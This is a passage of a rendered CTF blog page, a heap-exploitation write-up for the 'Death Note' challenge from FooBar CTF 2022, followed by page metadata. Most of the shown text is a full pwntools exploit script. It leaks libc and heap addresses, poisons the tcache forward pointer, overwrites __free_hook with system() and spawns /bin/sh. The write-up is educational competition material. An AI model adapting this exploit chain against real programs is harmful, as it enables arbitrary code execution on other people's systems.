number\",children:\"0x1c5220\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"log\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Libc base: \"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"##################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"### Stage 2: Leak heap address ###\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"##################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<<\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"log\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Heap base: \"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"##########################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"### Stage 3: Overwrite forward pointer ###\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"##########################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'testtest'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"fake_fw_pointer \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xb40\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__free_hook'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),\"                 \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Padding to tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" flat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x111\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"               \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Prev_size and size of tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" flat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fake_fw_pointer\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Overwrite forward pointer\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x130\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"######################################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"### Stage 4: Overwrite `__free_hook` with system() ###\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"######################################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"11\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'/bin/sh'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'system'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"11\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"4-get-flag\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#4-get-flag\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"4. Get flag\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Unfortunately, the time has passed and the server was closed so I cannot connect to it to get the flag but I ran it locally.\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/get_flag.png\",alt:\"get_flag.png\"})})]})}}var f=b;return w;})();\n;return Component;","toc":[{"value":"FoobarCTF - Death Note","url":"#foobarctf---death-note","depth":2},{"value":"1. Find bug","url":"#1-find-bug","depth":2},{"value":"2. Brainstorming","url":"#2-brainstorming","depth":2},{"value":"Reference sources","url":"#reference-sources","depth":3},{"value":"Summary:","url":"#summary","depth":3},{"value":"3. Exploit","url":"#3-exploit","depth":2},{"value":"Stage 1: Leak main arena address","url":"#stage-1-leak-main-arena-address","depth":3},{"value":"Stage 2: Leak heap address","url":"#stage-2-leak-heap-address","depth":3},{"value":"Stage 3: Overwrite forward pointer","url":"#stage-3-overwrite-forward-pointer","depth":3},{"value":"Stage 4: Overwrite __free_hook with system()","url":"#stage-4-overwrite-__free_hook-with-system","depth":3},{"value":"4. Get flag","url":"#4-get-flag","depth":2}],"frontMatter":{"readingTime":{"text":"18 min read","minutes":17.69,"time":1061400,"words":3538},"slug":"foobar-ctf-2022/death-note","fileName":"foobar-ctf-2022/death-note.md","title":"FooBar CTF 2022 – Death Note","date":"2022-03-08T00:00:00.000Z","draft":false,"authors":["Johnathan"],"tags":["FooBar CTF 2022","pwn","heap","Shell","Binary Exploit"],"summary":"A classic heap challenge in FooBar.","canonical":"https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/FooBar-CTF-2022/Death-note"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["Johnathan"],"fileName":"Johnathan.md","name":"Johnathan","avatar":"https://www.gravatar.com/avatar/aa9cc3f27f3b1f3c47841d62f18c039f?d=identicon&s=256","specialties":["Pwn"],"github":"https://github.com/nhtri2003gmail","member":true,"retired":true,"description":"A person who does magic things.","order":2,"date":null}],"prev":{"title":"Ugra CTF Quals 2022 – Хохорейсинг","date":"2022-03-04T00:00:00.000Z","draft":false,"authors":["thebish0p"],"tags":["Ugra CTF Quals 2022","Crypto","XOR","Automation","Web Socket"],"summary":"Sometimes you have to google the outputs xD","slug":"ugra-ctf-quals-2022/xorxorracing"},"next":{"title":"UTCTF 2022 – IRC","date":"2022-03-11T00:00:00.000Z","draft":false,"authors":["n0b0dy"],"tags":["UTCTF 2022","forensics","volatility"],"summary":"Analyze memory dump and recover password.","canonical":"","slug":"utctf-2022/irc"}},"__N_SSG":true}